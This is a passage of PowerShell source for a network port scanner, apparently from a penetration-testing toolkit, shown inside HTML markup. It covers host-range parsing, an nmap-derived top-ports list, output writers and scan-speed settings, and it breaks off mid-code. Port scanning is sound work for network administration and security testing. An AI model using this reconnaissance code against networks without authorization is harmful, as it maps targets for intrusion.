[Alias(&quot;F&quot;)]</span><br><span class="line">                   [Switch] $ForceOverwrite</span><br><span class="line"></span><br><span class="line">        #TODO add script parameter</span><br><span class="line">        #TODO add resume parameter</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    PROCESS &#123;</span><br><span class="line"></span><br><span class="line">        Set-StrictMode -Version 2.0</span><br><span class="line"></span><br><span class="line">        $version = .13</span><br><span class="line">        $hostList = New-Object System.Collections.ArrayList</span><br><span class="line">        $portList = New-Object System.Collections.ArrayList</span><br><span class="line">        $hostPortList = New-Object System.Collections.ArrayList</span><br><span class="line"></span><br><span class="line">        $scannedHostList = @()</span><br><span class="line"></span><br><span class="line">        function Parse-Hosts</span><br><span class="line">        &#123;</span><br><span class="line">            Param (</span><br><span class="line">                [Parameter(Mandatory = $True)] [String] $Hosts</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            [String[]] $iHosts = $Hosts.Split(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">            $IPRangeRegex = &quot;\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;-\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;&quot;</span><br><span class="line"></span><br><span class="line">            foreach($iHost in $iHosts)</span><br><span class="line">            &#123;</span><br><span class="line">                $iHost = $iHost.Replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">                if(!$iHost)</span><br><span class="line">                &#123;</span><br><span class="line">                    continue</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if($iHost.contains(&quot;/&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    $netPart = $iHost.split(&quot;/&quot;)[0]</span><br><span class="line">                    [uint32]$maskPart = $iHost.split(&quot;/&quot;)[1]</span><br><span class="line"></span><br><span class="line">                    $address = [System.Net.IPAddress]::Parse($netPart)</span><br><span class="line"></span><br><span class="line">                    if ($maskPart -ge $address.GetAddressBytes().Length * 8)</span><br><span class="line">                    &#123;</span><br><span class="line">                        throw &quot;Bad host mask&quot;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $numhosts = [System.math]::Pow(2,(($address.GetAddressBytes().Length *8) - $maskPart))</span><br><span class="line"></span><br><span class="line">                    $startaddress = $address.GetAddressBytes()</span><br><span class="line">                    [array]::Reverse($startaddress)</span><br><span class="line"></span><br><span class="line">                    $startaddress = [System.BitConverter]::ToUInt32($startaddress, 0)</span><br><span class="line">                    [uint32]$startMask = ([System.math]::Pow(2, $maskPart)-1) * ([System.Math]::Pow(2,(32 - $maskPart)))</span><br><span class="line">                    $startAddress = $startAddress -band $startMask</span><br><span class="line"></span><br><span class="line">                    #in powershell 2.0 there are 4 0 bytes padded, so the [0..3] is necessary</span><br><span class="line">                    $startAddress = [System.BitConverter]::GetBytes($startaddress)[0..3]</span><br><span class="line">                    [array]::Reverse($startaddress)</span><br><span class="line"></span><br><span class="line">                    $address = [System.Net.IPAddress] [byte[]] $startAddress</span><br><span class="line"></span><br><span class="line">                    $hostList.Add($address.IPAddressToString)</span><br><span class="line"></span><br><span class="line">                    for ($i=0; $i -lt $numhosts-1; $i++)</span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        $nextAddress =  $address.GetAddressBytes()</span><br><span class="line">                        [array]::Reverse($nextAddress)</span><br><span class="line">                        $nextAddress =  [System.BitConverter]::ToUInt32($nextAddress, 0)</span><br><span class="line">                        $nextAddress ++</span><br><span class="line">                        $nextAddress = [System.BitConverter]::GetBytes($nextAddress)[0..3]</span><br><span class="line">                        [array]::Reverse($nextAddress)</span><br><span class="line"></span><br><span class="line">                        $address = [System.Net.IPAddress] [byte[]] $nextAddress</span><br><span class="line">                        $hostList.Add($address.IPAddressToString)</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if($iHost -match $IPRangeRegex)</span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                $iHostPart1 = ($iHost.Split(&quot;-&quot;))[0]</span><br><span class="line">                $iHostPart2 = ($iHost.Split(&quot;-&quot;))[1]       </span><br><span class="line"></span><br><span class="line">                $LowerBound = $iHostPart1.Split(&quot;.&quot;)</span><br><span class="line">                $UpperBound = $iHostPart2.Split(&quot;.&quot;)</span><br><span class="line"></span><br><span class="line">                $LowerBoundInt = ($LowerBound[0].ToInt32($null),$LowerBound[1].ToInt32($null),$LowerBound[2].ToInt32($null),$LowerBound[3].ToInt32($null))</span><br><span class="line">                $UpperBoundInt = ($UpperBound[0].ToInt32($null),$UpperBound[1].ToInt32($null),$UpperBound[2].ToInt32($null),$UpperBound[3].ToInt32($null))</span><br><span class="line"></span><br><span class="line">                $CurrentIP = $LowerBoundInt</span><br><span class="line">                $CurrentIPString = $null</span><br><span class="line">                $ControlArray = @(0,0,0,0)</span><br><span class="line"></span><br><span class="line">                $null = $hostList.Add($iHostPart1)</span><br><span class="line"></span><br><span class="line">                    while($CurrentIPString -ne $iHostPart2)</span><br><span class="line">                    &#123;</span><br><span class="line">                        for($i=0;$i -lt 4;$i++)</span><br><span class="line">                        &#123;</span><br><span class="line"></span><br><span class="line">                            if(($CurrentIP[$i] -eq $UpperBoundInt[$i]) -and (($i -eq 0) -or $ControlArray[$i-1] -eq 1))</span><br><span class="line">                            &#123;</span><br><span class="line">                                $ControlArray[$i] = 1</span><br><span class="line">                                continue</span><br><span class="line">                            &#125;</span><br><span class="line">                            else</span><br><span class="line">                            &#123;</span><br><span class="line">        </span><br><span class="line">                                $Max = 254</span><br><span class="line">                                if(($i -ne 0) -and ($ControlArray[$i-1] -eq 1))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    $Max = $UpperBoundInt[$i]   </span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                if(($i -ne 3) -and ($CurrentIP[$i+1] -eq 254))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    $CurrentIP[$i]++</span><br><span class="line">                                    $CurrentIP[$i+1]=0</span><br><span class="line"></span><br><span class="line">                                    $CurrentIPString = ($CurrentIP[0].ToString() + &quot;.&quot; + $CurrentIP[1].ToString() + &quot;.&quot; + $CurrentIP[2].ToString() + &quot;.&quot; + $CurrentIP[3].ToString())</span><br><span class="line">                                    $null = $hostList.Add($CurrentIPString)</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                if(($i -eq 3) -and ($CurrentIP[$i] -lt $Max))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    $CurrentIP[$i]++</span><br><span class="line"></span><br><span class="line">                                    $CurrentIPString = ($CurrentIP[0].ToString() + &quot;.&quot; + $CurrentIP[1].ToString() + &quot;.&quot; + $CurrentIP[2].ToString() + &quot;.&quot; + $CurrentIP[3].ToString())</span><br><span class="line">                                    $null = $hostList.Add($CurrentIPString)</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">  </span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    $hostList.Add($iHost)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function Parse-ILHosts</span><br><span class="line">        &#123;</span><br><span class="line">           Param (</span><br><span class="line">                [Parameter(Mandatory = $True)] [String] $HostFile</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            Get-Content $HostFile | ForEach-Object &#123;</span><br><span class="line">                Parse-Hosts $_</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function Exclude-Hosts</span><br><span class="line">        &#123;</span><br><span class="line">            Param (</span><br><span class="line">                [Parameter(Mandatory = $True)] [String] $excludeHosts</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            [String[]] $iHosts = $excludeHosts.Split(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">            foreach($iHost in $iHosts)</span><br><span class="line">            &#123;</span><br><span class="line">                $iHost = $iHost.Replace(&quot; &quot;, &quot;&quot;)</span><br><span class="line">                $hostList.Remove($iHost)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function Get-TopPort</span><br><span class="line">        &#123;</span><br><span class="line">            Param (</span><br><span class="line">                [Parameter(Mandatory = $True)]</span><br><span class="line">                [ValidateRange(1,1000)]</span><br><span class="line">                [int] $numPorts</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            #list of top 1000 ports from nmap from Jun 2013</span><br><span class="line">            [int[]] $topPortList = @(80,23,443,21,3389,110,445,139,143,53,135,3306,8080,22</span><br><span class="line">                        1723,111,995,993,5900,1025,1720,548,113,81,6001,179,1026,2000,8443,</span><br><span class="line">                        8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,</span><br><span class="line">                        5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,</span><br><span class="line">                        990,5357,49156,543,544,5101,144,7,389,8009,9999,5009,7070,5190,3000,</span><br><span class="line">                        5432,1900,3986,13,1029,9,5051,6646,49157,1028,873,1755,2717,4899,9100,</span><br><span class="line">                        119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,</span><br><span class="line">                        5050,19,8031,1041,255,1048,1049,1053,1054,1056,1064,3703,17,808,3689,</span><br><span class="line">                        1031,1044,1071,5901,100,9102,2869,4001,5120,8010,9000,2105,636,1038,</span><br><span class="line">                        2601,1,7000,1066,1069,625,311,280,254,4000,1761,5003,2002,1998,2005,</span><br><span class="line">                        1032,1050,6112,1521,2161,6002,2401,902,4045,787,7937,1058,2383,1033,</span><br><span class="line">                        1040,1059,50000,5555,1494,3,593,2301,3268,7938,1022,1234,1035,1036,1037,</span><br><span class="line">                        1074,8002,9001,464,497,1935,2003,6666,6543,24,1352,3269,1111,407,500,</span><br><span class="line">                        20,2006,1034,1218,3260,15000,4444,264,33,2004,1042,42510,999,3052,1023,</span><br><span class="line">                        222,1068,888,7100,1717,992,2008,7001,2007,8082,512,1043,2009,5801,1700,</span><br><span class="line">                        7019,50001,4662,2065,42,2602,3333,9535,5100,2604,4002,5002,1047,1051,1052,</span><br><span class="line">                        1055,1060,1062,1311,3283,4443,5225,5226,6059,6789,8089,8651,8652,8701,9415,</span><br><span class="line">                        9593,9594,9595,16992,16993,20828,23502,32769,33354,35500,52869,55555,55600,</span><br><span class="line">                        64623,64680,65000,65389,1067,13782,366,5902,9050,85,1002,5500,1863,1864,</span><br><span class="line">                        5431,8085,10243,45100,49999,51103,49,90,6667,1503,6881,27000,340,1500,8021,</span><br><span class="line">                        2222,5566,8088,8899,9071,5102,6005,9101,163,5679,146,648,1666,83,3476,5004,</span><br><span class="line">                        5214,8001,8083,8084,9207,14238,30,912,12345,2030,2605,6,541,4,1248,3005,8007,</span><br><span class="line">                        306,880,2500,1086,1088,2525,4242,8291,9009,52822,900,6101,2809,7200,211,800,</span><br><span class="line">                        987,1083,12000,705,711,20005,6969,13783,1045,1046,1061,1063,1070,1072,1073,</span><br><span class="line">                        1075,1077,1078,1079,1081,1082,1085,1093,1094,1096,1098,1099,1100,1104,1106,</span><br><span class="line">                        1107,1108,1148,1169,1272,1310,1687,1718,1783,1840,2100,2119,2135,2144,2160,</span><br><span class="line">                        2190,2260,2381,2399,2492,2607,2718,2811,2875,3017,3031,3071,3211,3300,3301,</span><br><span class="line">                        3323,3325,3351,3404,3551,3580,3659,3766,3784,3801,3827,3998,4003,4126,4129,</span><br><span class="line">                        4449,5222,5269,5633,5718,5810,5825,5877,5910,5911,5925,5959,5960,5961,5962,</span><br><span class="line">                        5987,5988,5989,6123,6129,6156,6389,6580,6901,7106,7625,7777,7778,7911,8086,</span><br><span class="line">                        8181,8222,8333,8400,8402,8600,8649,8873,8994,9002,9011,9080,9220,9290,9485,</span><br><span class="line">                        9500,9502,9503,9618,9900,9968,10002,10012,10024,10025,10566,10616,10617,10621,</span><br><span class="line">                        10626,10628,10629,11110,13456,14442,15002,15003,15660,16001,16016,16018,17988,</span><br><span class="line">                        19101,19801,19842,20000,20031,20221,20222,21571,22939,24800,25734,27715,28201,</span><br><span class="line">                        30000,30718,31038,32781,32782,33899,34571,34572,34573,40193,48080,49158,49159,</span><br><span class="line">                        49160,50003,50006,50800,57294,58080,60020,63331,65129,691,212,1001,1999,2020,</span><br><span class="line">                        2998,6003,7002,50002,32,2033,3372,99,425,749,5903,43,458,5405,6106,6502,7007,</span><br><span class="line">                        13722,1087,1089,1124,1152,1183,1186,1247,1296,1334,1580,1782,2126,2179,2191,2251,</span><br><span class="line">                        2522,3011,3030,3077,3261,3493,3546,3737,3828,3871,3880,3918,3995,4006,4111,4446,</span><br><span class="line">                        5054,5200,5280,5298,5822,5859,5904,5915,5922,5963,7103,7402,7435,7443,7512,8011,</span><br><span class="line">                        8090,8100,8180,8254,8500,8654,9091,9110,9666,9877,9943,9944,9998,10004,10778,15742,</span><br><span class="line">                        16012,18988,19283,19315,19780,24444,27352,27353,27355,32784,49163,49165,49175,</span><br><span class="line">                        50389,50636,51493,55055,56738,61532,61900,62078,1021,9040,666,700,84,545,1112,</span><br><span class="line">                        1524,2040,4321,5802,38292,49400,1084,1600,2048,2111,3006,6547,6699,9111,16080,</span><br><span class="line">                        555,667,720,801,1443,1533,2106,5560,6007,1090,1091,1114,1117,1119,1122,1131,1138,</span><br><span class="line">                        1151,1175,1199,1201,1271,1862,2323,2393,2394,2608,2725,2909,3003,3168,3221,3322,</span><br><span class="line">                        3324,3390,3517,3527,3800,3809,3814,3826,3869,3878,3889,3905,3914,3920,3945,3971,</span><br><span class="line">                        4004,4005,4279,4445,4550,4567,4848,4900,5033,5080,5087,5221,5440,5544,5678,5730,</span><br><span class="line">                        5811,5815,5850,5862,5906,5907,5950,5952,6025,6510,6565,6567,6689,6692,6779,6792,</span><br><span class="line">                        6839,7025,7496,7676,7800,7920,7921,7999,8022,8042,8045,8093,8099,8200,8290,8292,</span><br><span class="line">                        8300,8383,9003,9081,9099,9200,9418,9575,9878,9898,9917,10003,10180,10215,11111,</span><br><span class="line">                        12174,12265,14441,15004,16000,16113,17877,18040,18101,19350,25735,26214,27356,</span><br><span class="line">                        30951,32783,32785,40911,41511,44176,44501,49161,49167,49176,50300,50500,52673,</span><br><span class="line">                        52848,54045,54328,55056,56737,57797,60443,70,417,714,722,777,981,1009,2022,4224,</span><br><span class="line">                        4998,6346,301,524,668,765,2041,5999,10082,259,1007,1417,1434,1984,2038,2068,4343,</span><br><span class="line">                        6009,7004,44443,109,687,726,911,1461,2035,4125,6006,7201,9103,125,481,683,903,</span><br><span class="line">                        1011,1455,2013,2043,2047,6668,6669,256,406,843,2042,2045,5998,9929,31337,44442,</span><br><span class="line">                        1092,1095,1102,1105,1113,1121,1123,1126,1130,1132,1137,1141,1145,1147,1149,1154,</span><br><span class="line">                        1164,1165,1166,1174,1185,1187,1192,1198,1213,1216,1217,1233,1236,1244,1259,1277,</span><br><span class="line">                        1287,1300,1301,1309,1322,1328,1556,1641,1688,1719,1721,1805,1812,1839,1875,1914,</span><br><span class="line">                        1971,1972,1974,2099,2170,2196,2200,2288,2366,2382,2557,2800,2910,2920,2968,3007,</span><br><span class="line">                        3013,3050,3119,3304,3307,3376,3400,3410,3514,3684,3697,3700,3824,3846,3848,3859,</span><br><span class="line">                        3863,3870,3872,3888,3907,3916,3931,3941,3957,3963,3968,3969,3972,3990,3993,3994,</span><br><span class="line">                        4009,4040,4080,4096,4143,4147,4200,4252,4430,4555,4600,4658,4875,4949,5040,5063,</span><br><span class="line">                        5074,5151,5212,5223,5242,5279,5339,5353,5501,5807,5812,5818,5823,5868,5869,5899,</span><br><span class="line">                        5905,5909,5914,5918,5938,5940,5968,5981,6051,6060,6068,6203,6247,6500,6504,6520,</span><br><span class="line">                        6550,6600)</span><br><span class="line">            $numPorts--</span><br><span class="line">            $portList.AddRange($topPortList[0..$numPorts])</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function Parse-Ports</span><br><span class="line">        &#123;</span><br><span class="line">            Param (</span><br><span class="line">                [Parameter(Mandatory = $True)] [String] $Ports,</span><br><span class="line">                [Parameter(Mandatory = $True)] $pList</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            foreach ($pRange in $Ports.Split(&quot;,&quot;))</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                #-1 is a special case for ping</span><br><span class="line">                if ($pRange -eq &quot;-1&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $pList.Add([int]$pRange)</span><br><span class="line">                &#125;</span><br><span class="line">                elseif ($pRange.Contains(&quot;-&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                    [int[]] $range = $pRange.Split(&quot;-&quot;)</span><br><span class="line">                    if ($range.Count -ne 2 -or $pRange.Split(&quot;-&quot;)[0] -eq &quot;&quot; -or $pRange.split(&quot;-&quot;)[1] -eq &quot;&quot;)</span><br><span class="line">                    &#123;</span><br><span class="line">                        throw &quot;Invalid port range&quot;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $pList.AddRange($range[0]..$range[1])</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    $pList.Add([int]$pRange)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            foreach ($p in $pList)</span><br><span class="line">            &#123;</span><br><span class="line">                if ($p -lt -1 -or $p -gt 65535)</span><br><span class="line">                &#123;</span><br><span class="line">                    throw &quot;Port $p out of range&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        function Parse-IpPorts</span><br><span class="line">        &#123;</span><br><span class="line">           Param (</span><br><span class="line">                [Parameter(Mandatory = $True)] [String] $PortFile</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            Get-Content $PortFile | ForEach-Object &#123;</span><br><span class="line">                Parse-Ports -Ports $_ -pList $portList</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function Remove-Ports</span><br><span class="line">        &#123;</span><br><span class="line">            Param (</span><br><span class="line">                [Parameter(Mandatory = $True)] [string] $ExcludedPorts</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            [int[]] $ExcludedPorts = $ExcludedPorts.Split(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">            foreach ($x in $ExcludedPorts)</span><br><span class="line">            &#123;</span><br><span class="line">                $portList.Remove($x)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function Write-PortscanOut</span><br><span class="line">        &#123;</span><br><span class="line">            Param (</span><br><span class="line">                [Parameter(Mandatory = $True, ParameterSetName=&quot;Comment&quot;)] [string] $comment,</span><br><span class="line">                [Parameter(Mandatory = $True, ParameterSetName=&quot;HostOut&quot;)] [string] $outhost,</span><br><span class="line">                [Parameter(Mandatory = $True, ParameterSetName=&quot;HostOut&quot;)] [bool] $isUp,</span><br><span class="line">                [Parameter(Mandatory = $True, ParameterSetName=&quot;HostOut&quot;)] $openPorts,</span><br><span class="line">                [Parameter(Mandatory = $True, ParameterSetName=&quot;HostOut&quot;)] $closedPorts,</span><br><span class="line">                [Parameter(Mandatory = $True, ParameterSetName=&quot;HostOut&quot;)] $filteredPorts,</span><br><span class="line">                [Parameter()] [bool] $SkipDiscovery,</span><br><span class="line">                [Parameter()] [System.IO.StreamWriter] $grepStream,</span><br><span class="line">                [Parameter()] [System.Xml.XmlWriter] $xmlStream,</span><br><span class="line">                [Parameter()] [System.IO.StreamWriter] $readableStream</span><br><span class="line"></span><br><span class="line">            )</span><br><span class="line">            switch ($PSCmdlet.ParameterSetName)</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Comment&quot;</span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    Write-Verbose $comment</span><br><span class="line"></span><br><span class="line">                    if ($grepStream) &#123;</span><br><span class="line">                        $grepStream.WriteLine(&quot;# &quot; + $comment)</span><br><span class="line">                    &#125;</span><br><span class="line">                    if ($xmlStream) &#123;</span><br><span class="line">                        $xmlStream.WriteComment($comment)</span><br><span class="line">                    &#125;</span><br><span class="line">                    if ($readableStream) &#123;</span><br><span class="line">                        $readableStream.WriteLine($comment)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                &quot;HostOut&quot;</span><br><span class="line">                &#123;</span><br><span class="line">                    $oPort = [string]::join(&quot;,&quot;, $openPorts.ToArray())</span><br><span class="line">                    $cPort = [string]::join(&quot;,&quot;, $closedPorts.ToArray())</span><br><span class="line">                    $fPort = [string]::join(&quot;,&quot;, $filteredPorts.ToArray())</span><br><span class="line"></span><br><span class="line">                    if ($grepStream) &#123;</span><br><span class="line">                       #for grepstream use tabs - can be ugly, but easier for regex</span><br><span class="line">                       if ($isUp -and !$SkipDiscovery) &#123;</span><br><span class="line">                            $grepStream.writeline(&quot;Host: $outhost`tStatus: Up&quot;)</span><br><span class="line">                        &#125;</span><br><span class="line">                        if ($isUp -or $SkipDiscovery) &#123;</span><br><span class="line">                            if ($oPort -ne &quot;&quot;) &#123;</span><br><span class="line">                                $grepStream.writeline(&quot;Host: $outhost`tOpen Ports: $oPort&quot;)</span><br><span class="line">                            &#125;</span><br><span class="line">                            if ($cPort -ne &quot;&quot;) &#123;</span><br><span class="line">                                $grepStream.writeline(&quot;Host: $outhost`tClosed Ports: $cPort&quot;)</span><br><span class="line">                            &#125;</span><br><span class="line">                            if ($fPort -ne &quot;&quot;) &#123;</span><br><span class="line">                                $grepStream.writeline(&quot;Host: $outhost`tFiltered Ports: $fPort&quot;)</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        elseif (!$SkipDiscovery) &#123;</span><br><span class="line">                            $grepStream.writeline(&quot;Host: $outhost`tStatus: Down&quot;)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if ($xmlStream) &#123;</span><br><span class="line">                        $xmlStream.WriteStartElement(&quot;Host&quot;)</span><br><span class="line"></span><br><span class="line">                        $xmlStream.WriteAttributeString(&quot;id&quot;, $outhost)</span><br><span class="line">                        if (!$SkipDiscovery) &#123;</span><br><span class="line">                            if ($isUp) &#123;</span><br><span class="line">                                $xmlStream.WriteAttributeString(&quot;Status&quot;, &quot;Up&quot;)</span><br><span class="line">                             &#125;</span><br><span class="line">                             else &#123;</span><br><span class="line">                                $xmlStream.WriteAttributeString(&quot;Status&quot;, &quot;Downs&quot;)</span><br><span class="line">                             &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        $xmlStream.WriteStartElement(&quot;Ports&quot;)</span><br><span class="line">                        foreach($p in $openPorts) &#123;</span><br><span class="line">                            $xmlStream.writestartElement(&quot;Port&quot;)</span><br><span class="line">                            $xmlStream.WriteAttributeString(&quot;id&quot;, [string]$p)</span><br><span class="line">                            $xmlStream.WriteAttributeString(&quot;state&quot;, &quot;open&quot;)</span><br><span class="line">                            $xmlStream.WriteEndElement()</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                        foreach ($p in $closedPorts) &#123;</span><br><span class="line">                            $xmlStream.writestartElement(&quot;Port&quot;)</span><br><span class="line">                            $xmlStream.WriteAttributeString(&quot;id&quot;, [string]$p)</span><br><span class="line">                            $xmlStream.WriteAttributeString(&quot;state&quot;, &quot;closed&quot;)</span><br><span class="line">                            $xmlStream.WriteEndElement()</span><br><span class="line">                        &#125;</span><br><span class="line">                        foreach ($p in $filteredPorts) &#123;</span><br><span class="line">                            $xmlStream.writestartElement(&quot;Port&quot;)</span><br><span class="line">                            $xmlStream.WriteAttributeString(&quot;id&quot;, [string]$p)</span><br><span class="line">                            $xmlStream.WriteAttributeString(&quot;state&quot;, &quot;filtered&quot;)</span><br><span class="line">                            $xmlStream.WriteEndElement()</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        $xmlStream.WriteEndElement()</span><br><span class="line">                        $xmlStream.WriteEndElement()</span><br><span class="line">                    &#125;</span><br><span class="line">                    if ($readableStream) &#123;</span><br><span class="line">                        $readableStream.writeline(&quot;Porscan.ps1 scan report for $outhost&quot;)</span><br><span class="line">                        if ($isUp) &#123;</span><br><span class="line">                            $readableStream.writeline(&quot;Host is up&quot;)</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        if ($isUp -or $SkipDiscovery) &#123;</span><br><span class="line"></span><br><span class="line">                            $readableStream.writeline((&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot; -f &quot;PORT&quot;, &quot;STATE&quot;))</span><br><span class="line"></span><br><span class="line">                            [int[]]$allports = $openPorts + $closedPorts + $filteredPorts</span><br><span class="line">                            foreach($p in ($allports| Sort-Object))</span><br><span class="line">                            &#123;</span><br><span class="line">                                if ($openPorts.Contains($p)) &#123;</span><br><span class="line">                                    $readableStream.writeline((&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot; -f $p, &quot;open&quot;))</span><br><span class="line">                                &#125;</span><br><span class="line">                                elseif ($closedPorts.Contains($p)) &#123;</span><br><span class="line">                                    $readableStream.writeline((&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot; -f $p, &quot;closed&quot;))</span><br><span class="line">                                &#125;</span><br><span class="line">                                elseif ($filteredPorts.Contains($p)) &#123;</span><br><span class="line">                                    $readableStream.writeline((&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot; -f $p, &quot;filtered&quot;))</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                        elseif(!$SkipDiscovery) &#123;</span><br><span class="line">                            $readableStream.writeline(&quot;Host is Down&quot;)</span><br><span class="line">                        &#125;</span><br><span class="line">                        $readableStream.writeline(&quot;&quot;)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #function for Powershell v2.0 to work</span><br><span class="line">        function Convert-SwitchtoBool</span><br><span class="line">        &#123;</span><br><span class="line">            Param (</span><br><span class="line">                [Parameter(Mandatory = $True)] $switchValue</span><br><span class="line">            )</span><br><span class="line">            If ($switchValue) &#123;</span><br><span class="line">                return $True</span><br><span class="line">            &#125;</span><br><span class="line">            return $False</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            [bool] $SkipDiscovery = Convert-SwitchtoBool ($SkipDiscovery)</span><br><span class="line">            [bool] $PingOnly = Convert-SwitchtoBool ($PingOnly)</span><br><span class="line">            [bool] $quiet  = Convert-SwitchtoBool ($quiet)</span><br><span class="line">            [bool] $ForceOverwrite  = Convert-SwitchtoBool ($ForceOverwrite)</span><br><span class="line"></span><br><span class="line">            #########</span><br><span class="line">            #parse arguments</span><br><span class="line">            #########</span><br><span class="line"></span><br><span class="line">            [Environment]::CurrentDirectory=(Get-Location -PSProvider FileSystem).ProviderPath</span><br><span class="line"></span><br><span class="line">            if ($PsCmdlet.ParameterSetName -eq &quot;cmdHosts&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                foreach($h in $Hosts)</span><br><span class="line">                &#123;</span><br><span class="line">                    Parse-Hosts($h) | Out-Null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                Parse-ILHosts($HostFile) | Out-Null</span><br><span class="line">            &#125;</span><br><span class="line">            if($ExcludeHosts)</span><br><span class="line">            &#123;</span><br><span class="line">                Exclude-Hosts($ExcludeHosts)</span><br><span class="line">            &#125;</span><br><span class="line">            if (($TopPorts -and $Ports) -or ($TopPorts -and $PortFile))</span><br><span class="line">            &#123;</span><br><span class="line">                throw &quot;Cannot set topPorts with other specific ports&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            if($Ports)</span><br><span class="line">            &#123;</span><br><span class="line">                Parse-Ports -Ports $Ports -pList $portList | Out-Null</span><br><span class="line">            &#125;</span><br><span class="line">            if($PortFile)</span><br><span class="line">            &#123;</span><br><span class="line">                Parse-IpPorts($PortFile) | Out-Null</span><br><span class="line">            &#125;</span><br><span class="line">            if($portList.Count -eq 0)</span><br><span class="line">            &#123;</span><br><span class="line">                if ($TopPorts)</span><br><span class="line">                &#123;</span><br><span class="line">                    Get-TopPort($TopPorts) | Out-Null</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    #if the ports still aren&#x27;t set, give the deftault, top 50 ports</span><br><span class="line">                    Get-TopPort(50) | Out-Null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if ($ExcludedPorts)</span><br><span class="line">            &#123;</span><br><span class="line">                Remove-Ports -ExcludedPorts $ExcludedPorts | Out-Null</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if($T)</span><br><span class="line">            &#123;</span><br><span class="line">                switch ($T)</span><br><span class="line">                &#123;</span><br><span class="line">                    5 &#123;$nHosts=30;  $Threads = 1000; $Timeout = 750 &#125;</span><br><span class="line">                    4 &#123;$nHosts=25;  $Threads = 1000; $Timeout = 1200 &#125;</span><br><span class="line">                    3 &#123;$nHosts=20;  $Threads = 100;  $Timeout = 2500 &#125;</span><br><span class="line">                    2 &#123;$nHosts=15;  $Threads = 32;   $Timeout = 3000 &#125;</span><br><span 